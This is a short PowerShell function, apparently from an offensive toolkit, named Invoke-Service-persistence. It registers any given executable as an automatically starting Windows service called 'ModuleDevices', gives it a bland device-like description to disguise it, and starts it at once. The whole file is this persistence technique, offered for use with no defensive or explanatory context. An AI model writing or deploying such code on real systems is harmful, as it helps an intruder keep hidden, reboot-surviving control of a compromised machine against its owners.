function Invoke-Service-persistence
{
    [CmdletBinding()]
    Param(
        [string]$exePath
    )

	New-Service -Name "ModuleDevices" -BinaryPathName $exePath -DisplayName "Module Devices" -StartupType "Automatic" -Description "Module Devices"
	Start-Service -Name "ModuleDevices"
}